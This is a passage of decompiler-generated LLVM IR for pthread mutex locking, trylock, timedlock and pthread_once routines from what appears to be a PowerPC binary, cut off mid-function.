  store i32 0, i32* %v2_10006760, align 4
  %v0_10006790.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10006790

dec_label_pc_10006790:                            ; preds = %dec_label_pc_1000673c, %dec_label_pc_10006788
  %v0_10006790 = phi i32 [ %v0_1000672c, %dec_label_pc_1000673c ], [ %v0_10006790.pre, %dec_label_pc_10006788 ]
  %v1_10006790 = add i32 %v0_10006790, 16
  store i32 %v1_10006790, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006798.224 to i32), i32* @lr, align 4
  %v0_10006794 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10006798

dec_label_pc_10006798:                            ; preds = %dec_label_pc_100067c0, %dec_label_pc_10006790
  store i32 0, i32* @r9, align 4
  br label %dec_label_pc_100067d0

dec_label_pc_100067a0:                            ; preds = %dec_label_pc_10006748
  %v1_100067a0 = add i32 %v0_1000672c, 8
  %v2_100067a0 = inttoptr i32 %v1_100067a0 to i32*
  %v3_100067a0 = load i32, i32* %v2_100067a0, align 4
  %v1_100067a4 = load i32, i32* @r2, align 4
  %v4_100067a4 = icmp eq i32 %v3_100067a0, %v1_100067a4
  br i1 %v4_100067a4, label %dec_label_pc_100067ac, label %dec_label_pc_100067cc

dec_label_pc_100067ac:                            ; preds = %dec_label_pc_100067a0
  %v1_100067ac = add i32 %v0_1000672c, 16
  %v2_100067ac = inttoptr i32 %v1_100067ac to i32*
  %v3_100067ac = load i32, i32* %v2_100067ac, align 4
  %v3_100067b0 = icmp eq i32 %v3_100067ac, 0
  br i1 %v3_100067b0, label %dec_label_pc_100067cc, label %dec_label_pc_100067b8

dec_label_pc_100067b8:                            ; preds = %dec_label_pc_100067ac
  store i32 0, i32* %v2_100067a0, align 4
  %v0_100067c0.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100067c0

dec_label_pc_100067c0:                            ; preds = %dec_label_pc_10006750, %dec_label_pc_100067b8
  %v0_100067c0 = phi i32 [ %v0_1000672c, %dec_label_pc_10006750 ], [ %v0_100067c0.pre, %dec_label_pc_100067b8 ]
  %v1_100067c0 = add i32 %v0_100067c0, 16
  store i32 268462024, i32* @lr, align 4
  %v1_100067c4 = inttoptr i32 %v1_100067c0 to i32*
  %v2_100067c4 = call i32 @__pthread_alt_unlock(i32* %v1_100067c4)
  br label %dec_label_pc_10006798

dec_label_pc_100067cc:                            ; preds = %dec_label_pc_10006760, %dec_label_pc_100067a0, %dec_label_pc_100067ac
  store i32 1, i32* @r9, align 4
  br label %dec_label_pc_100067d0

dec_label_pc_100067d0:                            ; preds = %dec_label_pc_10006758, %dec_label_pc_10006798, %dec_label_pc_10006778, %dec_label_pc_100067cc
  %v0_100067d4 = phi i32 [ 22, %dec_label_pc_10006758 ], [ 0, %dec_label_pc_10006798 ], [ %v0_100067d4.pre, %dec_label_pc_10006778 ], [ 1, %dec_label_pc_100067cc ]
  ret i32 %v0_100067d4

; uselistorder directives
  uselistorder i32 %v0_1000672c, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder label %dec_label_pc_100067d0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100067cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100067c0, { 1, 0 }
  uselistorder label %dec_label_pc_10006790, { 1, 0 }
  uselistorder label %dec_label_pc_10006758, { 1, 0 }
}

define i32 @__pthread_once_fork_parent(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1002c82c.221 to i32), i32* @r3, align 4
  %v0_100067ec = call i32 @pthread_mutex_unlock()
  ret i32 %v0_100067ec
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v1_10006804 = add i32 %arg1, 12
  %v2_10006804 = inttoptr i32 %v1_10006804 to i32*
  %v3_10006804 = load i32, i32* %v2_10006804, align 4
  %v3_10006808 = icmp eq i32 %v3_10006804, 1
  br i1 %v3_10006808, label %dec_label_pc_10006848, label %dec_label_pc_10006810

dec_label_pc_10006810:                            ; preds = %entry
  %v2_10006808 = icmp sgt i32 %v3_10006804, 1
  br i1 %v2_10006808, label %dec_label_pc_10006820, label %dec_label_pc_10006814

dec_label_pc_10006814:                            ; preds = %dec_label_pc_10006810
  %v3_10006814 = icmp eq i32 %v3_10006804, 0
  br i1 %v3_10006814, label %dec_label_pc_10006838, label %dec_label_pc_10006830

dec_label_pc_10006820:                            ; preds = %dec_label_pc_10006810
  %v3_10006820 = icmp eq i32 %v3_10006804, 2
  br i1 %v3_10006820, label %dec_label_pc_10006888, label %dec_label_pc_10006828

dec_label_pc_10006828:                            ; preds = %dec_label_pc_10006820
  %v3_10006828 = icmp eq i32 %v3_10006804, 3
  br i1 %v3_10006828, label %dec_label_pc_100068b4, label %dec_label_pc_10006830

dec_label_pc_10006830:                            ; preds = %dec_label_pc_10006814, %dec_label_pc_10006828
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100068c4

dec_label_pc_10006838:                            ; preds = %dec_label_pc_10006814
  %v1_10006838 = add i32 %arg1, 16
  store i32 %v1_10006838, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10006844.225 to i32), i32* @lr, align 4
  %v0_10006840 = call i32 @__pthread_lock()
  br label %dec_label_pc_100068c0

dec_label_pc_10006848:                            ; preds = %entry
  %v1_10006848 = add i32 %arg1, 8
  %v2_10006848 = inttoptr i32 %v1_10006848 to i32*
  %v3_10006848 = load i32, i32* %v2_10006848, align 4
  %v0_1000684c = load i32, i32* @r2, align 4
  store i32 %v0_1000684c, i32* @r30, align 4
  %v4_10006850 = icmp eq i32 %v3_10006848, %v0_1000684c
  br i1 %v4_10006850, label %dec_label_pc_10006858, label %dec_label_pc_1000686c

dec_label_pc_10006858:                            ; preds = %dec_label_pc_10006848
  %v1_10006858 = add i32 %arg1, 4
  %v2_10006858 = inttoptr i32 %v1_10006858 to i32*
  %v3_10006858 = load i32, i32* %v2_10006858, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10006860 = add i32 %v3_10006858, 1
  store i32 %v1_10006860, i32* @r9, align 4
  store i32 %v1_10006860, i32* %v2_10006858, align 4
  br label %dec_label_pc_100068c4

dec_label_pc_1000686c:                            ; preds = %dec_label_pc_10006848
  %v1_1000686c = add i32 %arg1, 16
  store i32 %v1_1000686c, i32* @r3, align 4
  store i32 %v0_1000684c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10006878.226 to i32), i32* @lr, align 4
  %v0_10006874 = call i32 @__pthread_lock()
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10006880 = load i32, i32* @r31, align 4
  %v2_10006880 = add i32 %v1_10006880, 4
  %v3_10006880 = inttoptr i32 %v2_10006880 to i32*
  store i32 0, i32* %v3_10006880, align 4
  br label %dec_label_pc_100068ac

dec_label_pc_10006888:                            ; preds = %dec_label_pc_10006820
  %v1_10006888 = add i32 %arg1, 8
  %v2_10006888 = inttoptr i32 %v1_10006888 to i32*
  %v3_10006888 = load i32, i32* %v2_10006888, align 4
  %v0_1000688c = load i32, i32* @r2, align 4
  store i32 %v0_1000688c, i32* @r30, align 4
  store i32 35, i32* %r3.global-to-local, align 4
  %v4_10006894 = icmp eq i32 %v3_10006888, %v0_1000688c
  br i1 %v4_10006894, label %dec_label_pc_100068c4, label %dec_label_pc_1000689c

dec_label_pc_1000689c:                            ; preds = %dec_label_pc_10006888
  %v1_1000689c = add i32 %arg1, 16
  store i32 %v1_1000689c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100068a8.227 to i32), i32* @lr, align 4
  %v2_100068a4 = inttoptr i32 %v1_1000689c to i32*
  %v3_100068a4 = call i32 @__pthread_alt_lock(i32* %v2_100068a4, i32 %v0_1000688c)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100068ac

dec_label_pc_100068ac:                            ; preds = %dec_label_pc_1000686c, %dec_label_pc_1000689c
  %v0_100068ac = load i32, i32* @r30, align 4
  %v1_100068ac = load i32, i32* @r31, align 4
  %v2_100068ac = add i32 %v1_100068ac, 8
  %v3_100068ac = inttoptr i32 %v2_100068ac to i32*
  store i32 %v0_100068ac, i32* %v3_100068ac, align 4
  br label %dec_label_pc_100068c4

dec_label_pc_100068b4:                            ; preds = %dec_label_pc_10006828
  %v1_100068b4 = add i32 %arg1, 16
  store i32 %v1_100068b4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100068c0.228 to i32), i32* @lr, align 4
  %v2_100068bc = inttoptr i32 %v1_100068b4 to i32*
  %v3_100068bc = call i32 @__pthread_alt_lock(i32* %v2_100068bc, i32 0)
  br label %dec_label_pc_100068c0

dec_label_pc_100068c0:                            ; preds = %dec_label_pc_10006838, %dec_label_pc_100068b4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100068c4

dec_label_pc_100068c4:                            ; preds = %dec_label_pc_10006888, %dec_label_pc_100068ac, %dec_label_pc_10006858, %dec_label_pc_10006830, %dec_label_pc_100068c0
  %v0_100068d4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100068d4

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 0 }
  uselistorder i32 %arg1, { 7, 0, 6, 5, 4, 1, 8, 3, 2, 9 }
  uselistorder label %dec_label_pc_100068c4, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100068c0, { 1, 0 }
  uselistorder label %dec_label_pc_100068ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006830, { 1, 0 }
}

define i32 @__pthread_once_fork_prepare(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100068e0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c82c.221 to i32))
  ret i32 %v1_100068e0
}

define i32 @pthread_once(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_100068fc = load i32, i32* %arg1, align 4
  %v3_10006900 = icmp eq i32 %v2_100068fc, 2
  br i1 %v3_10006900, label %dec_label_pc_100069fc, label %dec_label_pc_10006910

dec_label_pc_10006910:                            ; preds = %entry
  store i32 268462364, i32* @lr, align 4
  %v1_10006918 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c82c.221 to i32))
  %v0_1000691c = load i32, i32* @r31, align 4
  %v1_1000691c = inttoptr i32 %v0_1000691c to i32*
  %v2_1000691c = load i32, i32* %v1_1000691c, align 4
  store i32 %v2_1000691c, i32* @r11, align 4
  %v1_10006920 = urem i32 %v2_1000691c, 4
  %v3_10006924 = icmp eq i32 %v1_10006920, 1
  br i1 %v3_10006924, label %dec_label_pc_1000692c, label %dec_label_pc_10006950.preheader

dec_label_pc_1000692c:                            ; preds = %dec_label_pc_10006910
  %v1_10006930 = call i32 @__asm_rlwinm(i32 %v2_1000691c, i32 0, i32 0, i32 29)
  %v3_10006934 = load i32, i32* @global_var_1002c36c.223, align 4
  %v4_10006938 = icmp eq i32 %v1_10006930, %v3_10006934
  br i1 %v4_10006938, label %dec_label_pc_10006950.preheader, label %dec_label_pc_10006940

dec_label_pc_10006940:                            ; preds = %dec_label_pc_1000692c
  %v1_10006944 = load i32, i32* @r31, align 4
  %v2_10006944 = inttoptr i32 %v1_10006944 to i32*
  store i32 0, i32* %v2_10006944, align 4
  br label %dec_label_pc_10006950.preheader

dec_label_pc_10006950.preheader:                  ; preds = %dec_label_pc_10006940, %dec_label_pc_1000692c, %dec_label_pc_10006910
  %v0_100069505 = load i32, i32* @r31, align 4
  %v1_100069506 = inttoptr i32 %v0_100069505 to i32*
  %v2_100069507 = load i32, i32* %v1_100069506, align 4
  store i32 %v2_100069507, i32* @r9, align 4
  %v1_100069608 = urem i32 %v2_100069507, 4
  %v3_1000696811 = icmp eq i32 %v1_100069608, 1
  br i1 %v3_1000696811, label %dec_label_pc_1000694c, label %dec_label_pc_10006970

dec_label_pc_1000694c:                            ; preds = %dec_label_pc_10006950.preheader, %dec_label_pc_1000694c
  %v2_1000695012 = phi i32 [ %v2_10006950, %dec_label_pc_1000694c ], [ %v2_100069507, %dec_label_pc_10006950.preheader ]
  store i32 268462416, i32* @lr, align 4
  %v3_1000694c = call i32 @__GI_pthread_cond_wait(i32 ptrtoint (i32* @global_var_1002c844.222 to i32), i32 ptrtoint (i32* @global_var_1002c82c.221 to i32), i32 %v2_1000695012)
  %v0_10006950 = load i32, i32* @r31, align 4
  %v1_10006950 = inttoptr i32 %v0_10006950 to i32*
  %v2_10006950 = load i32, i32* %v1_10006950, align 4
  store i32 %v2_10006950, i32* @r9, align 4
  %v1_10006960 = urem i32 %v2_10006950, 4
  %v3_10006968 = icmp eq i32 %v1_10006960, 1
  br i1 %v3_10006968, label %dec_label_pc_1000694c, label %dec_label_pc_10006970

dec_label_pc_10006970:                            ; preds = %dec_label_pc_1000694c, %dec_label_pc_10006950.preheader
  %v1_10006950.lcssa = phi i32* [ %v1_100069506, %dec_label_pc_10006950.preheader ], [ %v1_10006950, %dec_label_pc_1000694c ]
  %v2_10006950.lcssa = phi i32 [ %v2_100069507, %dec_label_pc_10006950.preheader ], [ %v2_10006950, %dec_label_pc_1000694c ]
  %v3_10006970 = icmp eq i32 %v2_10006950.lcssa, 0
  store i32 0, i32* @r29, align 4
  br i1 %v3_10006970, label %dec_label_pc_1000697c, label %dec_label_pc_100069dc

dec_label_pc_1000697c:                            ; preds = %dec_label_pc_10006970
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_1002c82c.221 to i32), i32* @r3, align 4
  %v3_10006984 = load i32, i32* @global_var_1002c36c.223, align 4
  store i32 ptrtoint (i32* @global_var_1002c82c.221 to i32), i32* @r29, align 4
  %v1_1000698c = or i32 %v3_10006984, 1
  store i32 %v1_1000698c, i32* %v1_10006950.lcssa, align 4
  store i32 268462488, i32* @lr, align 4
  %v0_10006994 = call i32 @pthread_mutex_unlock()
  %v2_1000699c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000699c, i32* @r28, align 4
  %v0_100069a0 = load i32, i32* @r31, align 4
  %v4_100069ac = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-40, i32 268462612, i32 %v0_100069a0)
  %v0_100069b0 = load i32, i32* @r30, align 4
  call void @__pseudo_call(i32 %v0_100069b0)
  store i32 268462532, i32* @lr, align 4
  %v3_100069c0 = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-40, i32 0)
  %v0_100069c4 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_100069cc.229 to i32), i32* @lr, align 4
  %v1_100069c8 = call i32 @pthread_mutex_lock(i32 %v0_100069c4)
  store i32 1, i32* @r29, align 4
  %v1_100069d8 = load i32, i32* @r31, align 4
  %v2_100069d8 = inttoptr i32 %v1_100069d8 to i32*
  store i32 2, i32* %v2_100069d8, align 4
  br label %dec_label_pc_100069dc

dec_label_pc_100069dc:                            ; preds = %dec_label_pc_10006970, %dec_label_pc_1000697c
  store i32 ptrtoint (i32* @global_var_1002c82c.221 to i32), i32* @r3, align 4
  store i32 268462568, i32* @lr, align 4
  %v0_100069e4 = call i32 @pthread_mutex_unlock()
  %v0_100069e8 = load i32, i32* @r29, align 4
  %v3_100069e8 = icmp eq i32 %v0_100069e8, 0
  br i1 %v3_100069e8, label %dec_label_pc_100069fc, label %dec_label_pc_100069f0

dec_label_pc_100069f0:                            ; preds = %dec_label_pc_100069dc
  store i32 268462588, i32* @lr, align 4
  %v1_100069f8 = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_1002c844.222 to i32))
  br label %dec_label_pc_100069fc

dec_label_pc_100069fc:                            ; preds = %entry, %dec_label_pc_100069dc, %dec_label_pc_100069f0
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10006950, { 1, 0, 3, 2 }
  uselistorder i32 %v2_100069507, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1000691c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* @global_var_1002c36c.223, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_100069fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100069dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000694c, { 1, 0 }
}

define i32 @pthread_once_cancelhandler(i32* %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1002c82c.221 to i32), i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10006a38.230 to i32), i32* @lr, align 4
  %v1_10006a34 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c82c.221 to i32))
  store i32 0, i32* %arg1, align 4
  %v0_10006a40 = load i32, i32* @r29, align 4
  store i32 %v0_10006a40, i32* @r3, align 4
  store i32 268462664, i32* @lr, align 4
  %v0_10006a44 = call i32 @pthread_mutex_unlock()
  store i32 268462676, i32* @lr, align 4
  %v1_10006a50 = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_1002c844.222 to i32))
  ret i32 %v1_10006a50

; uselistorder directives
  uselistorder i32 (i32)* @pthread_cond_broadcast, { 1, 0 }
  uselistorder i32* @global_var_1002c844.222, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002c844.222 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002c82c.221 to i32), { 3, 7, 8, 2, 1, 0, 4, 5, 9, 6 }
}

define i32 @pthread_mutex_trylock(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v1_10006a7c = add i32 %arg1, 12
  %v2_10006a7c = inttoptr i32 %v1_10006a7c to i32*
  %v3_10006a7c = load i32, i32* %v2_10006a7c, align 4
  %v3_10006a80 = icmp eq i32 %v3_10006a7c, 1
  br i1 %v3_10006a80, label %dec_label_pc_10006ac8, label %dec_label_pc_10006a88

dec_label_pc_10006a88:                            ; preds = %entry
  %v2_10006a80 = icmp sgt i32 %v3_10006a7c, 1
  br i1 %v2_10006a80, label %dec_label_pc_10006a98, label %dec_label_pc_10006a8c

dec_label_pc_10006a8c:                            ; preds = %dec_label_pc_10006a88
  %v3_10006a8c = icmp eq i32 %v3_10006a7c, 0
  br i1 %v3_10006a8c, label %dec_label_pc_10006ab0, label %dec_label_pc_10006aa8

dec_label_pc_10006a98:                            ; preds = %dec_label_pc_10006a88
  %v3_10006a98 = icmp eq i32 %v3_10006a7c, 2
  br i1 %v3_10006a98, label %dec_label_pc_10006b08, label %dec_label_pc_10006aa0

dec_label_pc_10006aa0:                            ; preds = %dec_label_pc_10006a98
  %v3_10006aa0 = icmp eq i32 %v3_10006a7c, 3
  br i1 %v3_10006aa0, label %dec_label_pc_10006b20, label %dec_label_pc_10006aa8

dec_label_pc_10006aa8:                            ; preds = %dec_label_pc_10006a8c, %dec_label_pc_10006aa0
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006b38

dec_label_pc_10006ab0:                            ; preds = %dec_label_pc_10006a8c
  %v1_10006ab4 = add i32 %arg1, 16
  store i32 %v1_10006ab4, i32* %r3.global-to-local, align 4
  %v1_10006ac4 = inttoptr i32 %v1_10006ab4 to i32*
  %v2_10006ac4 = call i32 @__pthread_trylock(i32* %v1_10006ac4)
  store i32 %v2_10006ac4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006ac8

dec_label_pc_10006ac8:                            ; preds = %entry, %dec_label_pc_10006ab0
  %v0_10006ad8 = phi i32 [ %arg1, %entry ], [ %v2_10006ac4, %dec_label_pc_10006ab0 ]
  %v1_10006ac8 = add i32 %v0_10006ad8, 8
  %v2_10006ac8 = inttoptr i32 %v1_10006ac8 to i32*
  %v3_10006ac8 = load i32, i32* %v2_10006ac8, align 4
  %v0_10006acc = load i32, i32* @r2, align 4
  store i32 %v0_10006acc, i32* @r30, align 4
  %v4_10006ad0 = icmp eq i32 %v3_10006ac8, %v0_10006acc
  br i1 %v4_10006ad0, label %dec_label_pc_10006ad8, label %dec_label_pc_10006aec

dec_label_pc_10006ad8:                            ; preds = %dec_label_pc_10006ac8
  %v1_10006ad8 = add i32 %v0_10006ad8, 4
  %v2_10006ad8 = inttoptr i32 %v1_10006ad8 to i32*
  %v3_10006ad8 = load i32, i32* %v2_10006ad8, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10006ae0 = add i32 %v3_10006ad8, 1
  %v1_10006ae4 = load i32, i32* @r31, align 4
  %v2_10006ae4 = add i32 %v1_10006ae4, 4
  %v3_10006ae4 = inttoptr i32 %v2_10006ae4 to i32*
  store i32 %v1_10006ae0, i32* %v3_10006ae4, align 4
  br label %dec_label_pc_10006b38

dec_label_pc_10006aec:                            ; preds = %dec_label_pc_10006ac8
  %v1_10006aec = add i32 %v0_10006ad8, 16
  store i32 %v1_10006aec, i32* %r3.global-to-local, align 4
  %v1_10006af0 = inttoptr i32 %v1_10006aec to i32*
  %v2_10006af0 = call i32 @__pthread_trylock(i32* %v1_10006af0)
  store i32 %v2_10006af0, i32* %r3.global-to-local, align 4
  %v3_10006af4 = icmp eq i32 %v2_10006af0, 0
  br i1 %v3_10006af4, label %dec_label_pc_10006afc, label %dec_label_pc_10006b38

dec_label_pc_10006afc:                            ; preds = %dec_label_pc_10006aec
  %v0_10006afc = load i32, i32* @r30, align 4
  %v1_10006afc = load i32, i32* @r31, align 4
  %v2_10006afc = add i32 %v1_10006afc, 8
  %v3_10006afc = inttoptr i32 %v2_10006afc to i32*
  store i32 %v0_10006afc, i32* %v3_10006afc, align 4
  %v0_10006b00 = load i32, i32* %r3.global-to-local, align 4
  %v1_10006b00 = load i32, i32* @r31, align 4
  %v2_10006b00 = add i32 %v1_10006b00, 4
  %v3_10006b00 = inttoptr i32 %v2_10006b00 to i32*
  store i32 %v0_10006b00, i32* %v3_10006b00, align 4
  br label %dec_label_pc_10006b38

dec_label_pc_10006b08:                            ; preds = %dec_label_pc_10006a98
  %v1_10006b08 = add i32 %arg1, 16
  store i32 %v1_10006b08, i32* %r3.global-to-local, align 4
  %v1_10006b0c = inttoptr i32 %v1_10006b08 to i32*
  %v2_10006b0c = call i32 @__pthread_alt_trylock(i32* %v1_10006b0c)
  store i32 %v2_10006b0c, i32* %r3.global-to-local, align 4
  %v3_10006b10 = icmp eq i32 %v2_10006b0c, 0
  br i1 %v3_10006b10, label %dec_label_pc_10006b18, label %dec_label_pc_10006b38

dec_label_pc_10006b18:                            ; preds = %dec_label_pc_10006b08
  %v0_10006b18 = load i32, i32* @r2, align 4
  %v1_10006b18 = load i32, i32* @r31, align 4
  %v2_10006b18 = add i32 %v1_10006b18, 8
  %v3_10006b18 = inttoptr i32 %v2_10006b18 to i32*
  store i32 %v0_10006b18, i32* %v3_10006b18, align 4
  br label %dec_label_pc_10006b38

dec_label_pc_10006b20:                            ; preds = %dec_label_pc_10006aa0
  %v1_10006b24 = add i32 %arg1, 16
  store i32 %v1_10006b24, i32* %r3.global-to-local, align 4
  %v1_10006b34 = inttoptr i32 %v1_10006b24 to i32*
  %v2_10006b34 = call i32 @__pthread_alt_trylock(i32* %v1_10006b34)
  store i32 %v2_10006b34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006b38

dec_label_pc_10006b38:                            ; preds = %dec_label_pc_10006b08, %dec_label_pc_10006aec, %dec_label_pc_10006b18, %dec_label_pc_10006afc, %dec_label_pc_10006ad8, %dec_label_pc_10006aa8, %dec_label_pc_10006b20
  %v0_10006b48 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10006b48

; uselistorder directives
  uselistorder i32 %v0_10006ad8, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 11, 3, 4, 5, 6, 1, 2, 8, 7, 9, 10, 12, 0 }
  uselistorder i32 (i32*)* @__pthread_trylock, { 1, 0 }
  uselistorder i32 %arg1, { 3, 4, 5, 2, 1, 0, 6 }
  uselistorder label %dec_label_pc_10006b38, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_10006ac8, { 1, 0 }
  uselistorder label %dec_label_pc_10006aa8, { 1, 0 }
}

define i32 @pthread_mutex_timedlock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10006b68 = add i32 %arg2, 4
  %v2_10006b68 = inttoptr i32 %v1_10006b68 to i32*
  %v3_10006b68 = load i32, i32* %v2_10006b68, align 4
  %v3_10006b6c = icmp ugt i32 %v3_10006b68, 999999999
  br i1 %v3_10006b6c, label %dec_label_pc_10006c50, label %dec_label_pc_10006b74

dec_label_pc_10006b74:                            ; preds = %entry
  %v1_10006b74 = add i32 %arg1, 12
  %v2_10006b74 = inttoptr i32 %v1_10006b74 to i32*
  %v3_10006b74 = load i32, i32* %v2_10006b74, align 4
  %v3_10006b78 = icmp eq i32 %v3_10006b74, 1
  br i1 %v3_10006b78, label %dec_label_pc_10006bb8, label %dec_label_pc_10006b80

dec_label_pc_10006b80:                            ; preds = %dec_label_pc_10006b74
  %v2_10006b78 = icmp sgt i32 %v3_10006b74, 1
  br i1 %v2_10006b78, label %dec_label_pc_10006b90, label %dec_label_pc_10006b84

dec_label_pc_10006b84:                            ; preds = %dec_label_pc_10006b80
  %v3_10006b84 = icmp eq i32 %v3_10006b74, 0
  br i1 %v3_10006b84, label %dec_label_pc_10006ba4, label %dec_label_pc_10006c50

dec_label_pc_10006b90:                            ; preds = %dec_label_pc_10006b80
  %v3_10006b90 = icmp eq i32 %v3_10006b74, 2
  br i1 %v3_10006b90, label %dec_label_pc_10006bf8, label %dec_label_pc_10006b98

dec_label_pc_10006b98:                            ; preds = %dec_label_pc_10006b90
  %v3_10006b98 = icmp eq i32 %v3_10006b74, 3
  br i1 %v3_10006b98, label %dec_label_pc_10006c30, label %dec_label_pc_10006c50

dec_label_pc_10006ba4:                            ; preds = %dec_label_pc_10006b84
  %v1_10006ba4 = add i32 %arg1, 16
  store i32 %v1_10006ba4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006bb0.231 to i32), i32* @lr, align 4
  %v0_10006bac = call i32 @__pthread_lock()
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c5c

dec_label_pc_10006bb8:                            ; preds = %dec_label_pc_10006b74
  %v1_10006bb8 = add i32 %arg1, 8
  %v2_10006bb8 = inttoptr i32 %v1_10006bb8 to i32*
  %v3_10006bb8 = load i32, i32* %v2_10006bb8, align 4
  %v0_10006bbc = load i32, i32* @r2, align 4
  %v4_10006bc0 = icmp eq i32 %v3_10006bb8, %v0_10006bbc
  br i1 %v4_10006bc0, label %dec_label_pc_10006bc8, label %dec_label_pc_10006bdc

dec_label_pc_10006bc8:                            ; preds = %dec_label_pc_10006bb8
  %v1_10006bc8 = add i32 %arg1, 4
  %v2_10006bc8 = inttoptr i32 %v1_10006bc8 to i32*
  %v3_10006bc8 = load i32, i32* %v2_10006bc8, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10006bd0 = add i32 %v3_10006bc8, 1
  store i32 %v1_10006bd0, i32* %v2_10006bc8, align 4
  br label %dec_label_pc_10006c5c

dec_label_pc_10006bdc:                            ; preds = %dec_label_pc_10006bb8
  %v1_10006bdc = add i32 %arg1, 16
  store i32 %v1_10006bdc, i32* @r3, align 4
  store i32 %v0_10006bbc, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10006be8.232 to i32), i32* @lr, align 4
  %v0_10006be4 = call i32 @__pthread_lock()
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10006bf0 = load i32, i32* @r31, align 4
  %v2_10006bf0 = add i32 %v1_10006bf0, 4
  %v3_10006bf0 = inttoptr i32 %v2_10006bf0 to i32*
  store i32 0, i32* %v3_10006bf0, align 4
  br label %dec_label_pc_10006c28

dec_label_pc_10006bf8:                            ; preds = %dec_label_pc_10006b90
  %v1_10006bf8 = add i32 %arg1, 8
  %v2_10006bf8 = inttoptr i32 %v1_10006bf8 to i32*
  %v3_10006bf8 = load i32, i32* %v2_10006bf8, align 4
  %v0_10006bfc = load i32, i32* @r2, align 4
  store i32 35, i32* %r3.global-to-local, align 4
  %v4_10006c04 = icmp eq i32 %v3_10006bf8, %v0_10006bfc
  br i1 %v4_10006c04, label %dec_label_pc_10006c5c, label %dec_label_pc_10006c0c

dec_label_pc_10006c0c:                            ; preds = %dec_label_pc_10006bf8
  %v1_10006c10 = add i32 %arg1, 16
  store i32 %v1_10006c10, i32* %r3.global-to-local, align 4
  store i32 268463132, i32* @lr, align 4
  %v4_10006c18 = inttoptr i32 %v1_10006c10 to i32*
  %v5_10006c18 = call i32 @__pthread_alt_timedlock(i32* %v4_10006c18, i32 %v0_10006bfc, i32 %arg2, i32 999999999)
  store i32 %v5_10006c18, i32* %r3.global-to-local, align 4
  %v3_10006c1c = icmp eq i32 %v5_10006c18, 0
  br i1 %v3_10006c1c, label %dec_label_pc_10006c58, label %dec_label_pc_10006c24

dec_label_pc_10006c24:                            ; preds = %dec_label_pc_10006c0c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c28

dec_label_pc_10006c28:                            ; preds = %dec_label_pc_10006bdc, %dec_label_pc_10006c24
